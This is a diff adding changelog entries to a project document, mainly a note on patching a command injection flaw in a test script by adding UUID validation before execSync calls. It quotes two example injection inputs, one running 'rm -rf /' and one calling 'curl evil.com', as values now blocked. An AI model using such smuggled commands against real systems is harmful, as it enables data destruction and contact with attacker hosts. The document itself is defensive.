@@ -93,6 +93,17 @@ The application follows a client-staff separation architecture:
 
 ## Recent Changes
 
+- **July 25, 2025: 🛡️ CRITICAL SECURITY VULNERABILITY PATCHED - COMMAND INJECTION PREVENTION IMPLEMENTED**
+  * **HIGH-PRIORITY SECURITY FIX**: Resolved command injection vulnerability in test-real-docs-curl.js identified by static code analysis
+  * **VULNERABILITY DETAILS**: Fixed execSync() calls with unsanitized applicationId parameter that could allow arbitrary command execution
+  * **MITIGATION STRATEGY**: Implemented strict UUID validation regex pattern before all execSync operations in uploadRealDocuments() and finalizeApplication()
+  * **VALIDATION PATTERN**: Added comprehensive UUID format validation: `/^[0-9a-f]{8}-[0-9a-f]{4}-[1-5][0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i`
+  * **ATTACK PREVENTION**: System now blocks malicious inputs like `"test; rm -rf /; echo"` and `"valid-uuid && curl evil.com"` while allowing legitimate UUIDs
+  * **SECURITY TESTING VALIDATED**: Confirmed validation correctly accepts valid UUIDs (aac71c9a-d154-4914-8982-4f1a33ef8259) and rejects injection attempts
+  * **MINIMAL PATCH APPROACH**: Applied smallest possible fix maintaining backward compatibility while eliminating security risk
+  * **PRODUCTION IMPACT**: Test file security hardened without affecting application functionality or user experience
+  * **RECOMMENDATION**: Test the application thoroughly before deployment to ensure UUID validation doesn't break legitimate workflows
+
 - **July 25, 2025: 🎉 S3 INTEGRATION VERIFICATION COMPLETE - MIME TYPE RESOLUTION ACHIEVED FULL S3 COMPATIBILITY**
   * **CRITICAL BREAKTHROUGH**: Resolved final MIME type detection issue - staff backend S3 now accepts uploads with proper `application/pdf` content type
   * **MIME TYPE DETECTION FIXED**: Enhanced server FormData creation with proper `{ type: mimeType }` blob configuration ensuring staff backend S3 compatibility
